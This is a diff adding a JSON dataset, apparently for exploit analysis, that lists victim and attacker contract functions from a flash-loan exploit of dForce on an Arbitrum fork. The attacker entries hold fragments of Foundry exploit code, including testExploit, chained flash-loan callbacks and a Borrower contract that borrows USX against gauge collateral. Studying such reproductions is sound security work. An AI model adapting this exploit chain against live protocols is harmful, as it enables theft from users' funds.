@@ -1,0 +1,401 @@
+[
+  {
+    "contract/interface": "uniswapV3Flash",
+    "source_type": "victim_contract",
+    "function_name": "flash",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISwapFlashLoan",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "    function flashLoan(\n        IFlashLoanRecipient recipient,\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external override nonReentrant whenNotPaused {\n        InputHelpers.ensureInputLengthMatch(tokens.length, amounts.length);\n\n        uint256[] memory feeAmounts = new uint256[](tokens.length);\n        uint256[] memory preLoanBalances = new uint256[](tokens.length);\n\n        // Used to ensure `tokens` is sorted in ascending order, which ensures token uniqueness.\n        IERC20 previousToken = IERC20(0);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 amount = amounts[i];\n\n            _require(token > previousToken, token == IERC20(0) ? Errors.ZERO_TOKEN : Errors.UNSORTED_TOKENS);\n            previousToken = token;\n\n            preLoanBalances[i] = token.balanceOf(address(this));\n            feeAmounts[i] = _calculateFlashLoanFeeAmount(amount);\n\n            _require(preLoanBalances[i] >= amount, Errors.INSUFFICIENT_FLASH_LOAN_BALANCE);\n            token.safeTransfer(address(recipient), amount);\n        }\n\n        recipient.receiveFlashLoan(tokens, amounts, feeAmounts, userData);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 preLoanBalance = preLoanBalances[i];\n\n            // Checking for loan repayment first (without accounting for fees) makes for simpler debugging, and results\n            // in more accurate revert reasons if the flash loan protocol fee percentage is zero.\n            uint256 postLoanBalance = token.balanceOf(address(this));\n            _require(postLoanBalance >= preLoanBalance, Errors.INVALID_POST_LOAN_BALANCE);\n\n            // No need for checked arithmetic since we know the loan was fully repaid.\n            uint256 receivedFeeAmount = postLoanBalance - preLoanBalance;\n            _require(receivedFeeAmount >= feeAmounts[i], Errors.INSUFFICIENT_FLASH_LOAN_FEE_AMOUNT);\n\n            _payFeeAmount(token, receivedFeeAmount);\n            emit FlashLoan(recipient, token, amounts[i], receivedFeeAmount);\n        }\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "redeem",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVWSTETHCRVGAUGE",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "ZyberCall",
+    "original_code": "    function ZyberCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        SwapFlashLoans();\n        WETH.transfer(address(ZLP), ZLPFlashloanAmount * 10_000 / 9975 + 1000);\n    }\n    // 17. SwapFlashLoan\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        if (msg.sender == address(aaveV3)) {\n            RadiantFlashloan();\n            WETH.approve(address(aaveV3), type(uint256).max);\n            return true;\n        } else if (msg.sender == address(Radiant)) {\n            UniSwapV3Flashloan();\n            WETH.approve(address(Radiant), type(uint256).max);\n            return true;\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        aaveV3Flashloan();\n        WETH.transfer(address(balancer), balancerFlashloanAmount);\n    }\n    // 3.aaveV3Flashloan\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 59_527_633);\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(USX), \"USX\");\n        cheats.label(address(WSTETH), \"WSTETH\");\n        cheats.label(address(WSTETHCRV), \"WSTETHCRV\");\n        cheats.label(address(WSTETHCRVGAUGE), \"WSTETHCRVGAUGE\");\n        cheats.label(address(VWSTETHCRVGAUGE), \"VWSTETHCRVGAUGE\");\n        cheats.label(address(balancer), \"balancer\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(Radiant), \"Radiant\");\n        cheats.label(address(UniV3Flash), \"UniV3Flash\");\n        cheats.label(address(SLP1), \"SLP1\");\n        cheats.label(address(SLP2), \"SLP2\");\n        cheats.label(address(SLP3), \"SLP3\");\n        cheats.label(address(ZLP), \"ZLP\");\n        cheats.label(address(swapFlashLoan), \"swapFlashLoan\");\n        cheats.label(address(curvePool), \"curvePool\");\n        cheats.label(address(cointroller), \"cointroller\");\n        cheats.label(address(aArbWETH), \"aArbWETH\");\n        cheats.label(address(rWETH), \"rWETH\");\n        cheats.label(address(dForceContract), \"dForceContract\");\n        cheats.label(address(PriceOracle), \"PriceOracle\");\n        cheats.label(address(curveYSwap), \"curveYSwap\");\n        cheats.label(address(GMXVault), \"GMXVault\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        borrower = new Borrower();\n        payable(address(0x0)).transfer(address(this).balance);\n        WSTETH.approve(address(curvePool), type(uint256).max);\n        WSTETHCRV.approve(address(curvePool), type(uint256).max);\n        balancerFlashloan();\n        USX.approve(address(curveYSwap), type(uint256).max);\n        curveYSwap.exchange_underlying(0, 1, 500_000 * 1e18, 0);\n        emit log_named_decimal_uint(\n            \"19.swap the USX token to USDC, and swap USDC to WETH, the USDC amount\",\n            USDC.balanceOf(address(this)),\n            USDC.decimals()\n        );\n        USDC.transfer(address(GMXVault), USDC.balanceOf(address(this)));\n        GMXVault.swap(address(USDC), address(WETH), address(this));\n\n        emit log_named_decimal_uint(\n            \"20.Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n    // 1.balancerFlashloan\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV2Call",
+    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        if (msg.sender == address(SLP1)) {\n            SLP2Flashloan();\n            WETH.transfer(address(SLP1), SLP1FlashloanAmount * 1000 / 997 + 1000);\n        } else if (msg.sender == address(SLP2)) {\n            SLP3Flashloan();\n            WETH.transfer(address(SLP2), SLP2FlashloanAmount * 1000 / 997 + 1000);\n        } else if (msg.sender == address(SLP3)) {\n            ZyberFlashloan();\n            WETH.transfer(address(SLP3), SLP3FlashloanAmount * 1000 / 997 + 1000);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3FlashCallback",
+    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        SLP1Flashloan();\n        WETH.transfer(address(UniV3Flash), UniV3FlashloanAmount * 1000 / 997 + 1000);\n    }\n    // 9.sushipair1Flashloan\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GMXVAULT",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(\n        SingleSwap memory singleSwap,\n        FundManagement memory funds,\n        uint256 limit,\n        uint256 deadline\n    )\n        external\n        payable\n        override\n        nonReentrant\n        whenNotPaused\n        authenticateFor(funds.sender)\n        returns (uint256 amountCalculated)\n    {\n        // The deadline is timestamp-based: it should not be relied upon for sub-minute accuracy.\n        // solhint-disable-next-line not-rely-on-time\n        _require(block.timestamp <= deadline, Errors.SWAP_DEADLINE);\n\n        // This revert reason is for consistency with `batchSwap`: an equivalent `swap` performed using that function\n        // would result in this error.\n        _require(singleSwap.amount > 0, Errors.UNKNOWN_AMOUNT_IN_FIRST_SWAP);\n\n        IERC20 tokenIn = _translateToIERC20(singleSwap.assetIn);\n        IERC20 tokenOut = _translateToIERC20(singleSwap.assetOut);\n        _require(tokenIn != tokenOut, Errors.CANNOT_SWAP_SAME_TOKEN);\n\n        // Initializing each struct field one-by-one uses less gas than setting all at once.\n        IPoolSwapStructs.SwapRequest memory poolRequest;\n        poolRequest.poolId = singleSwap.poolId;\n        poolRequest.kind = singleSwap.kind;\n        poolRequest.tokenIn = tokenIn;\n        poolRequest.tokenOut = tokenOut;\n        poolRequest.amount = singleSwap.amount;\n        poolRequest.userData = singleSwap.userData;\n        poolRequest.from = funds.sender;\n        poolRequest.to = funds.recipient;\n        // The lastChangeBlock field is left uninitialized.\n\n        uint256 amountIn;\n        uint256 amountOut;\n\n        (amountCalculated, amountIn, amountOut) = _swapWithPool(poolRequest);\n        _require(singleSwap.kind == SwapKind.GIVEN_IN ? amountOut >= limit : amountIn <= limit, Errors.SWAP_LIMIT);\n\n        _receiveAsset(singleSwap.assetIn, amountIn, funds.sender, funds.fromInternalBalance);\n        _sendAsset(singleSwap.assetOut, amountOut, funds.recipient, funds.toInternalBalance);\n\n        // If the asset in is ETH, then `amountIn` ETH was wrapped into WETH.\n        _handleRemainingEth(_isETH(singleSwap.assetIn) ? amountIn : 0);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "A",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "add_liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "admin_fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "balances",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "calc_token_amount",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "coins",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "exchange",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "exchange_underlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "future_A",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "future_admin_fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "future_fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "get_dy",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "get_dy_underlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "get_virtual_price",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity_imbalance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity_one_coin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "underlying_coins",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Borrower",
+    "source_type": "attacker_contract",
+    "function_name": "exec",
+    "original_code": "    function exec() external {\n        emit log_named_decimal_uint(\n            \"12.deposit wstETHCRV to wstETHCRV-gauge, token amount\", 1_904_761_904_761_904_761_904, WSTETHCRV.decimals()\n        );\n        WSTETHCRV.approve(address(WSTETHCRVGAUGE), type(uint256).max);\n        uint256 depositAmount = 1_904_761_904_761_904_761_904;\n        address(WSTETHCRVGAUGE).call(abi.encodeWithSignature(\"deposit(uint256)\", depositAmount));\n        WSTETHCRVGAUGE.approve(address(dForceContract), type(uint256).max);\n        uint256 WSTETHCRVGAUGEAmount = WSTETHCRVGAUGE.balanceOf(address(this));\n        uint256 borrowAmount = 2_080_000_000_000_000_000_000_000;\n        (bool success,) = address(dForceContract).call(\n            abi.encodeWithSelector(0x4381c41a, uint256(1), WSTETHCRVGAUGEAmount, borrowAmount)\n        ); // get USX\n        require(success);\n        emit log_named_decimal_uint(\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDForce",
+    "source_type": "victim_contract",
+    "function_name": "borrowBalanceStored",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDForce",
+    "source_type": "victim_contract",
+    "function_name": "liquidateBorrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPriceOracleV2",
+    "source_type": "victim_contract",
+    "function_name": "getUnderlyingPrice",
+    "original_code": "",
+    "description": ""
+  }
+]
